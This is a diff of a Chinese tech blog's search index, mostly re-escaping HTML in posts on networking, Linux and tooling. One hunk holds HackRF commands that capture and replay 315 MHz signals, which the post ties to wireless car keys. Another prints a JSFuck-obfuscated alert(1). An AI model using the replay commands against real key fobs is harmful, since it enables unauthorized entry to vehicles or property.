class="meta">#</span><span class="bash"> -l：设置 Rx LNA 增益（0 到 40 dB 之间，每次增加 8 dB）</span></span><br><span class="line">hackrf_transfer -r capture.raw -f 315000000 -l 8/16/24 -g 20/40 [-s 2000000 -n 10000000 -a 1]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重放信号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -t：从文件中读取数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -x：设置 Tx VGA 增益（0 到 47 dB 之间，每次增加 1 dB）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -R：重复发送模式（默认为关闭）</span></span><br><span class="line">hackrf_transfer -t capture.raw -f 315000000 -x 40 [-s 2000000 -a 1]</span><br></pre></td></tr></table></figure>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hackrf_info    # 查看 Hack RF 连接信息</span><br><span class="line"></span><br><span class="line">hackrf_transfer    # 基于文件进行发送和接收 SDR</span><br><span class="line">hackrf_transfer -h    # 查看 hackrf_transfer 帮助信息</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">录制信号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-r：将数据存储到文件中</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f：中心频率，单位 Hz</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-s：采样率，单位 Hz（4/8/10/12.5/16/20 MHz，默认 10 MHz）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-n：采样数量（默认值是无限的）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-a：设置功放（1 表示开启，0 表示关闭）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-g：设置 Rx VGA 增益（0 到 62 dB 之间，每次增加 2 dB）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-l：设置 Rx LNA 增益（0 到 40 dB 之间，每次增加 8 dB）</span></span><br><span class="line">hackrf_transfer -r capture.raw -f 315000000 -l 8/16/24 -g 20/40 [-s 2000000 -n 10000000 -a 1]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重放信号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t：从文件中读取数据</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-x：设置 Tx VGA 增益（0 到 47 dB 之间，每次增加 1 dB）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-R：重复发送模式（默认为关闭）</span></span><br><span class="line">hackrf_transfer -t capture.raw -f 315000000 -x 40 [-s 2000000 -a 1]</span><br></pre></td></tr></table></figure>
 
 <p>一般无线钥匙工作频段都在 315 Mhz、433.92 Mhz。<br>Tx Mode：发射模式<br>Rx Mode：接收模式</p>
 ]]></content>
@@ -2206,11 +2206,11 @@
 </tr>
 <tr>
 <td>VIRT</td>
-<td>进程使用的虚拟（virtual）内存总量，单位 kb。VIRT=SWAP+RES</td>
+<td>进程使用的虚拟（virtual）内存总量，单位 kb。VIRT&#x3D;SWAP+RES</td>
 </tr>
 <tr>
 <td>RES</td>
-<td>进程使用的、未被换出的物理内存大小，单位 kb。RES=CODE+DATA</td>
+<td>进程使用的、未被换出的物理内存大小，单位 kb。RES&#x3D;CODE+DATA</td>
 </tr>
 <tr>
 <td>SHR</td>
@@ -2218,7 +2218,7 @@
 </tr>
 <tr>
 <td>S</td>
-<td>进程状态。D=不可中断的睡眠状态，R=运行态，S=睡眠态，T=跟踪/停止态，Z=僵尸态</td>
+<td>进程状态。D&#x3D;不可中断的睡眠状态，R&#x3D;运行态，S&#x3D;睡眠态，T&#x3D;跟踪&#x2F;停止态，Z&#x3D;僵尸态</td>
 </tr>
 <tr>
 <td>%CPU</td>
@@ -2277,7 +2277,7 @@
 
 <h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><p>HTTP 规范包含了对 HTTP 报文格式的定义。HTTP 报文有两种：请求报文和响应报文。</p>
 <h3 id="HTTP-请求报文"><a href="#HTTP-请求报文" class="headerlink" title="HTTP 请求报文"></a>HTTP 请求报文</h3><p>一个典型的示例如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /somedir/page.html HTTP/1.1</span><br><span class="line">Host: www.someschool.edu</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept-Language: fr</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /somedir/page.html HTTP/1.1</span><br><span class="line">Host: www.someschool.edu</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept-Language: fr</span><br></pre></td></tr></table></figure>
 
 <p>HTTP 请求报文的第一行叫做<strong>请求行</strong>（request line），其后继的行叫做<strong>首部行</strong>（header line）。</p>
 <p>请求行有 3 个字段：方法字段、URL 字段和 HTTP 版本字段。方法字段可以取几种不同的值，包括 <strong>GET</strong>、<strong>POST</strong>、<strong>HEAD</strong>、<strong>PUT</strong> 和 <strong>DELETE</strong>。绝大部分的 HTTP 请求报文使用 GET 方法。</p>
@@ -2287,7 +2287,7 @@
 <p>使用 GET 方法时实体体（entity body）为空，而使用 POST 方法时才使用该实体体。</p>
 <p>HEAD 方法类似于 GET 方法。当服务器收到使用 HEAD 方法的请求时，将会用一个 HTTP 报文进行响应，但是并不返回请求对象。应用程序开发者常用 HEAD 方法进行调试跟踪。PUT 方法常与 Web 发行工具联合使用，它运行用户上传对象到指定的 Web 服务器上指定的路径（目录）。PUT 方法也被那些需要向 Web 服务器上传对象的应用程序使用。DELETE 方法允许用户或者应用程序删除 Web 服务器上的对象。</p>
 <h3 id="HTTP-响应报文"><a href="#HTTP-响应报文" class="headerlink" title="HTTP 响应报文"></a>HTTP 响应报文</h3><p>一个典型的示例如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Tue, 18 Aug 2015 15:44:04 GMT</span><br><span class="line">Server: Apache/2.2.3 (CentOS)</span><br><span class="line">Last-Modified: Tue, 18 Aug 2015 15:11:03 GMT</span><br><span class="line">Content-Length: 6821</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">(data data data data data ...)</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Tue, 18 Aug 2015 15:44:04 GMT</span><br><span class="line">Server: Apache/2.2.3 (CentOS)</span><br><span class="line">Last-Modified: Tue, 18 Aug 2015 15:11:03 GMT</span><br><span class="line">Content-Length: 6821</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">(data data data data data ...)</span><br></pre></td></tr></table></figure>
 
 <p>上述响应报文有三个部分：一个初始<strong>状态行</strong>（status line），6 个<strong>首部行</strong>（header line），然后是<strong>实体体</strong>（entity body）。</p>
 <p>实体体部分是报文的主要部分，即它包含了所请求的对象本身。状态行有 3 个字段：协议版本字段、状态码和相应状态信息。</p>
@@ -2318,16 +2318,16 @@
 <p>Web 缓存器为了验证所缓存的对象是否是最新的，会使用条件 GET 方法向目标服务器发送一个请求报文，If-Modified-Since 首部行的值为当初缓存对象时响应报文中 Last-Modified 首部行的值。如果所要验证的对象是最新的，即没有被修改过，则目标服务器会返回一个“<strong>304 Not Modified</strong>”响应报文，其中实体体为空。</p>
 <p>通过使用 CDN（Content Distribution Network，内容分发网络），Web 缓存器正在因特网中发挥着越来越重要的作用。CDN 公司在因特网上安装了许多地理上分散的缓存器，因而使大量流量实现了本地化。</p>
 <h2 id="非持续连接和持续连接"><a href="#非持续连接和持续连接" class="headerlink" title="非持续连接和持续连接"></a>非持续连接和持续连接</h2><p>HTTP 可以采用非持续连接或持续连接，默认采用持续连接。</p>
-<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>目前多数大网站已经采用了 HTTP/2，还有一部分老旧网站仍然在使用 HTTP/1.1。</p>
-<p>HTTP/2 相比 HTTP/1.1 做的最大的改动是使用了多路复用，即同一个域名、同一个 IP 下的多个文件会共用一个 TCP 连接进行合并传输。</p>
-<p>HTTP/3 是未来的一个 HTTP 版本，它相比前两个版本，做的最大的改动是将弃用 TCP 协议，改为使用基于 UDP 协议的 QUIC 协议实现。</p>
+<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>目前多数大网站已经采用了 HTTP&#x2F;2，还有一部分老旧网站仍然在使用 HTTP&#x2F;1.1。</p>
+<p>HTTP&#x2F;2 相比 HTTP&#x2F;1.1 做的最大的改动是使用了多路复用，即同一个域名、同一个 IP 下的多个文件会共用一个 TCP 连接进行合并传输。</p>
+<p>HTTP&#x2F;3 是未来的一个 HTTP 版本，它相比前两个版本，做的最大的改动是将弃用 TCP 协议，改为使用基于 UDP 协议的 QUIC 协议实现。</p>
 <h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>HTTP 是一个<strong>无状态协议</strong>（stateless protocol），即 HTTP 服务器并不保存关于客户的任何信息。但我们可以通过 cookie 机制实现有状态的访问。</p>
 <p>有些文章将非持续连接翻译为 <em>短连接</em>，将持续连接翻译为 <em>长连接</em>，纵观 RFC 相关文档，找不到类似短连接或长连接这样的描述，因此，为保证严谨，个人推荐使用非持续连接或持续连接这样的描述。</p>
 <p>有的文章还将 HTTP 描述为 <em>无连接</em>，它们可能本意指的是无状态或非持续连接？纵观上述，找不到这样描述的原因，不应该使用无连接描述 HTTP。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
 <li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:64-75.</a></li>
-<li><a href="https://tools.ietf.org/html/rfc2616">RFC 2616 - Hypertext Transfer Protocol -- HTTP/1.1</a></li>
-<li><a href="https://tools.ietf.org/html/rfc7540">RFC 7540 - Hypertext Transfer Protocol Version 2 (HTTP/2)</a></li>
+<li><a href="https://tools.ietf.org/html/rfc2616">RFC 2616 - Hypertext Transfer Protocol -- HTTP&#x2F;1.1</a></li>
+<li><a href="https://tools.ietf.org/html/rfc7540">RFC 7540 - Hypertext Transfer Protocol Version 2 (HTTP&#x2F;2)</a></li>
 </ol>
 ]]></content>
       <categories>
@@ -2354,7 +2354,7 @@
 <ol>
 <li>A 生成报文 $m$，用 $s$ 级联 $m$ 以生成 $m+s$，并计算哈希 $H(m+s)$（例如使用 SHA-1）。$H(m+s)$ 被称为<strong>报文鉴别码</strong>（Message Authentication Code，<strong>MAC</strong>）。</li>
 <li>然后 A 将 MAC 附加到报文 $m$ 上，生成扩展报文 $(m, H(m+s))$，并将该扩展报文发送给 B。</li>
-<li>B 接收到一个扩展报文 $(m, h)$，由于知道 $s$，计算出报文鉴别码 $H(m+s)$。若 $H(m+s)=h$，则一切正常。</li>
+<li>B 接收到一个扩展报文 $(m, h)$，由于知道 $s$，计算出报文鉴别码 $H(m+s)$。若 $H(m+s)&#x3D;h$，则一切正常。</li>
 </ol>
 <p>MAC 的一个优良特点是它不要求一种加密算法，多年来已经提出了若干种对 MAC 的不同标准，目前最为流行的标准是 HMAC，它能够与 MD5 或 SHA-1 一道使用。</p>
 <p>其实使用数字签名也可以实现完整性，同时也验证了该报文的源（注意 MAC 并不能做到这一点）。具体使用 MAC 还是数字签名实现完整性，在不同的协议里有不同的选择，如 PGP 使用数字签名，而 OSPF 和 SSL 使用 MAC。</p>
@@ -2539,7 +2539,7 @@
 <p>这些数据报之一将最终沿着这条路到达目的主机。因为该数据报包含了一个具有不可达端口号的 UDP 报文段，该目的主机将向源发送一个端口不可达的 ICMP 报文（类型 3 编码 3）。当源主机收到这个特别的 ICMP 报文时，知道它不需要再发送另外的探测分组。</p>
 <p>标准的 Traceroute 程序实际上用相同的 TTL 发送 3 个一组的分组，因此 Traceroute 输出对每个 TTL 提供了 3 个结果。</p>
 <p>一个 Traceroute 运行示例如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tracert 185.199.109.153</span><br><span class="line"></span><br><span class="line">通过最多 30 个跃点跟踪</span><br><span class="line">到 cdn-185-199-109-153.github.com [185.199.109.153] 的路由:</span><br><span class="line"></span><br><span class="line">  1    26 ms     5 ms    51 ms  Hiwifi.lan [192.168.199.1]</span><br><span class="line">  2     *        *        *     请求超时。</span><br><span class="line">  3     9 ms    16 ms     6 ms  1.240.35.58.broad.xw.sh.dynamic.163data.com.cn [58.35.240.1]</span><br><span class="line">  4    11 ms    11 ms    10 ms  124.74.22.29</span><br><span class="line">  5     9 ms     6 ms    14 ms  61.152.24.42</span><br><span class="line">  6    27 ms    41 ms     *     202.97.50.154</span><br><span class="line">  7    21 ms    23 ms    30 ms  202.97.74.1</span><br><span class="line">  8    93 ms   102 ms   102 ms  202.97.94.10</span><br><span class="line">  9    85 ms     *        *     ae-3.r30.tokyjp05.jp.bb.gin.ntt.net [129.250.3.23]</span><br><span class="line"> 10     *       83 ms    78 ms  ae-2.r00.tokyjp08.jp.bb.gin.ntt.net [129.250.6.127]</span><br><span class="line"> 11    85 ms     *       81 ms  ae-2.fastly.tokyjp08.jp.bb.gin.ntt.net [117.103.177.66]</span><br><span class="line"> 12    72 ms    70 ms    80 ms  cdn-185-199-109-153.github.com [185.199.109.153]</span><br><span class="line"></span><br><span class="line">跟踪完成。</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">tracert 185.199.109.153</span><br><span class="line"></span><br><span class="line">通过最多 30 个跃点跟踪</span><br><span class="line">到 cdn-185-199-109-153.github.com [185.199.109.153] 的路由:</span><br><span class="line"></span><br><span class="line">  1    26 ms     5 ms    51 ms  Hiwifi.lan [192.168.199.1]</span><br><span class="line">  2     *        *        *     请求超时。</span><br><span class="line">  3     9 ms    16 ms     6 ms  1.240.35.58.broad.xw.sh.dynamic.163data.com.cn [58.35.240.1]</span><br><span class="line">  4    11 ms    11 ms    10 ms  124.74.22.29</span><br><span class="line">  5     9 ms     6 ms    14 ms  61.152.24.42</span><br><span class="line">  6    27 ms    41 ms     *     202.97.50.154</span><br><span class="line">  7    21 ms    23 ms    30 ms  202.97.74.1</span><br><span class="line">  8    93 ms   102 ms   102 ms  202.97.94.10</span><br><span class="line">  9    85 ms     *        *     ae-3.r30.tokyjp05.jp.bb.gin.ntt.net [129.250.3.23]</span><br><span class="line"> 10     *       83 ms    78 ms  ae-2.r00.tokyjp08.jp.bb.gin.ntt.net [129.250.6.127]</span><br><span class="line"> 11    85 ms     *       81 ms  ae-2.fastly.tokyjp08.jp.bb.gin.ntt.net [117.103.177.66]</span><br><span class="line"> 12    72 ms    70 ms    80 ms  cdn-185-199-109-153.github.com [185.199.109.153]</span><br><span class="line"></span><br><span class="line">跟踪完成。</span><br></pre></td></tr></table></figure>
 
 <p>可以看到输出有 6 列：</p>
 <ul>
@@ -2587,7 +2587,7 @@
     <title>IntelliJ 平台 IDE 中 Ctrl+Shift+F 快捷键无效问题解决</title>
     <url>/2021/05/02/intellij-platform-ctrl-shift-f-not-working/</url>
     <content><![CDATA[<p>在 IntelliJ 平台 IDE 中（如 PyCharm、IntelliJ IDEA 等），Ctrl+Shift+F 快捷键通常指在项目所有文件中搜索对应的关键词，这是一个常用的功能，然而近期笔者发现此快捷键莫名其妙的失效了（其他快捷键都工作良好），这很可能是与别的程序的快捷键相冲突导致的，经排查，是与 Windows 10 中微软拼音的简繁转换快捷键冲突。</p>
-<p>解决步骤依次为：<strong>设置</strong> ——&gt; <strong>时间和语言</strong> ——&gt; <strong>语言</strong> ——&gt; <strong>中文（简体，中国）</strong>——&gt; <strong>选项</strong> ——&gt; <strong>微软拼音</strong> ——&gt; <strong>选项</strong> ——&gt; <strong>按键</strong> ——&gt; <strong>简体/繁体中文输入切换</strong>，可以将其改为另一个键或者直接将其关闭。</p>
+<p>解决步骤依次为：<strong>设置</strong> ——&gt; <strong>时间和语言</strong> ——&gt; <strong>语言</strong> ——&gt; <strong>中文（简体，中国）</strong>——&gt; <strong>选项</strong> ——&gt; <strong>微软拼音</strong> ——&gt; <strong>选项</strong> ——&gt; <strong>按键</strong> ——&gt; <strong>简体&#x2F;繁体中文输入切换</strong>，可以将其改为另一个键或者直接将其关闭。</p>
 <p>此解决方案可能并不适应于每个人，具体还是要找到那个冲突的快捷键。</p>
 ]]></content>
       <categories>
@@ -2655,7 +2655,7 @@
   <entry>
     <title>盘点那些互联网公司的学生优惠</title>
     <url>/2018/09/26/it-student-discount/</url>
-    <content><![CDATA[<h2 id="JetBrains"><a href="#JetBrains" class="headerlink" title="JetBrains"></a><a href="https://www.jetbrains.com/">JetBrains</a></h2><p>JetBrains是捷克的一家软件公司，该公司专业生产各种编程语言的IDE，其中包括Java的IDE —— <a href="https://www.jetbrains.com/idea/">Intellij IDEA</a>，Python的IDE —— <a href="https://www.jetbrains.com/pycharm/">PyCharm</a>，JavaScript的IDE —— <a href="https://www.jetbrains.com/webstorm/">WebStorm</a>，C/C++的IDE —— <a href="https://www.jetbrains.com/clion/">CLion</a>等等。JetBrains系列的IDE一直以强大易用著称，甚至有人说，一个优秀的程序员应该使用JetBrains全家桶。<br>JetBrains的大多数IDE都是收费的，有的分为社区版（Community Edition）和专业版（Professional Edition）两种，专业版相比社区版有更多的功能，但也会收取相应的费用，然而，JetBrains对学生提供<a href="https://www.jetbrains.com/zh/student/">免费授权计划</a>，学生只要验证学生身份即可免费使用JetBrains的所有IDE。</p>
+    <content><![CDATA[<h2 id="JetBrains"><a href="#JetBrains" class="headerlink" title="JetBrains"></a><a href="https://www.jetbrains.com/">JetBrains</a></h2><p>JetBrains是捷克的一家软件公司，该公司专业生产各种编程语言的IDE，其中包括Java的IDE —— <a href="https://www.jetbrains.com/idea/">Intellij IDEA</a>，Python的IDE —— <a href="https://www.jetbrains.com/pycharm/">PyCharm</a>，JavaScript的IDE —— <a href="https://www.jetbrains.com/webstorm/">WebStorm</a>，C&#x2F;C++的IDE —— <a href="https://www.jetbrains.com/clion/">CLion</a>等等。JetBrains系列的IDE一直以强大易用著称，甚至有人说，一个优秀的程序员应该使用JetBrains全家桶。<br>JetBrains的大多数IDE都是收费的，有的分为社区版（Community Edition）和专业版（Professional Edition）两种，专业版相比社区版有更多的功能，但也会收取相应的费用，然而，JetBrains对学生提供<a href="https://www.jetbrains.com/zh/student/">免费授权计划</a>，学生只要验证学生身份即可免费使用JetBrains的所有IDE。</p>
 <span id="more"></span>
 <h2 id="Microsoft-Imagine"><a href="#Microsoft-Imagine" class="headerlink" title="Microsoft Imagine"></a><a href="https://imagine.microsoft.com/zh-CN">Microsoft Imagine</a></h2><p>Microsoft Imagine原名为DreamSpark，是微软为学生提供的一个资源集合，它包括了一些<a href="https://imagine.microsoft.com/zh-cn/catalog">软件和服务</a>，学生只要验证学生身份即可使用其中的工具。<br>个人认为，Imagine相比之前的DreamSpark，为学生提供的免费资源少了许多。具体而言，它提供如下资源：</p>
 <ul>
@@ -2711,7 +2711,7 @@
     <title>JSFuck</title>
     <url>/2018/08/10/jsfuck/</url>
     <content><![CDATA[<p>JSFuck是一种JavaScript的编码方式，它的命名起源于Brainfuck，同样，为了避讳脏话，它又被写作JSF*ck，以JSFuck风格写出的代码不需要另外的编译器或解释器执行，原生的JavaScript解释器即可直接运行。<br>JSFuck种共使用<code>[</code>、<code>]</code>、<code>(</code>、<code>)</code>、<code>!</code>、<code>+</code>这<strong>6</strong>种字符。<code>alert(1)</code>这段JavaScript代码用JSFuck风格表示如下所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure>
 
 <p>要将任意的JavaScript代码编码为JSFuck风格，可前往<a href="http://www.jsfuck.com/">JSFuck</a>。</p>
 ]]></content>
@@ -2722,7 +2722,7 @@
   <entry>
     <title>Jupyter Notebook 常用扩展</title>
     <url>/2018/09/25/jupyter-notebook-extensions/</url>
-    <content><![CDATA[<h2 id="扩展机制"><a href="#扩展机制" class="headerlink" title="扩展机制"></a>扩展机制</h2><p>在介绍常用扩展之前，有必要先来介绍一下 Jupyter Notebook 的扩展机制：本质上来说，所有的 Jupyter Notebook 扩展都是一个个的 Python 包，所以大部分可以通过 <code>pip</code> 快速安装，另外，Jupyter Notebook 是一个典型的 <strong>B/S</strong> 架构的应用，用户通过访问浏览器来使用 Jupyter Notebook，因此，Jupyter Notebook 的扩展可以只针对服务器端，也可以针对前端资源页面，而如果一个扩展增强了 Jupyter Notebook 的前端资源页面，则它还必须使用如下命令安装资源：</p>
+    <content><![CDATA[<h2 id="扩展机制"><a href="#扩展机制" class="headerlink" title="扩展机制"></a>扩展机制</h2><p>在介绍常用扩展之前，有必要先来介绍一下 Jupyter Notebook 的扩展机制：本质上来说，所有的 Jupyter Notebook 扩展都是一个个的 Python 包，所以大部分可以通过 <code>pip</code> 快速安装，另外，Jupyter Notebook 是一个典型的 <strong>B&#x2F;S</strong> 架构的应用，用户通过访问浏览器来使用 Jupyter Notebook，因此，Jupyter Notebook 的扩展可以只针对服务器端，也可以针对前端资源页面，而如果一个扩展增强了 Jupyter Notebook 的前端资源页面，则它还必须使用如下命令安装资源：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">jupyter nbextension install helpful_package --py <span class="comment"># or --sys-prefix if using virtualenv or conda</span></span><br></pre></td></tr></table></figure>
 
 <p>安装完资源后，如果这个资源需要在每次 Jupyter Notebook 启动后被加载，则还应使用如下命令启用资源：</p>
@@ -2761,7 +2761,7 @@
     <title>Kali 持久加密 USB 安装所遇问题总结</title>
     <url>/2017/12/04/kali-live-usb-bug/</url>
     <content><![CDATA[<h2 id="Writing-superblocks-and-filesystem-accounting-information"><a href="#Writing-superblocks-and-filesystem-accounting-information" class="headerlink" title="Writing superblocks and filesystem accounting information"></a>Writing superblocks and filesystem accounting information</h2><p>今天在将 Kali 安装到 U 盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用 <code>mkfs.ext4</code> 格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生 U 盘挂掉又重连上的情况，使用 <code>dmesg</code> 命令诊断故障时发现如下错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">device descriptor read/8, error -110</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">device descriptor read/8, error -110</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>经判断是因为主板无法提供给 U 盘足够的电量所导致的，因为我的 U 盘和虚拟机之间是 3.0 连接的，3.0 连接要比 2.0 连接耗电，所以将 U 盘和虚拟机之间的连接改为 2.0 即可解决这个问题。</p>
 <h2 id="时间问题"><a href="#时间问题" class="headerlink" title="时间问题"></a>时间问题</h2><p>安装好 Kali 并启动之后，会发现 Kali 的系统时间始终无法和 Windows 的系统时间保持一致，具体表现如下：</p>
@@ -2780,7 +2780,7 @@
     <title>Kali Rolling 2017 更新后无法启动解决方案</title>
     <url>/2017/11/25/kali-update-bug/</url>
     <content><![CDATA[<h2 id="BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash"><a href="#BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash" class="headerlink" title="BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)"></a>BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</h2><p>有时更新 Kali 后重新启动会出现如下显示，并无法进入系统界面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">(initramfs)</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">(initramfs)</span><br></pre></td></tr></table></figure>
 
 <p><strong>解决方法：</strong></p>
 <ol>
@@ -2806,9 +2806,11 @@
 <p><strong>解决方法 2：</strong></p>
 <ol>
 <li><p>卸载 w3af 要求的 pyOpenSSL 版本</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip uninstall pyOpenSSL</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip uninstall pyOpenSSL</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>安装最新版 pyOpenSSL</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install pyOpenSSL</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install pyOpenSSL</span><br></pre></td></tr></table></figure>
+</li>
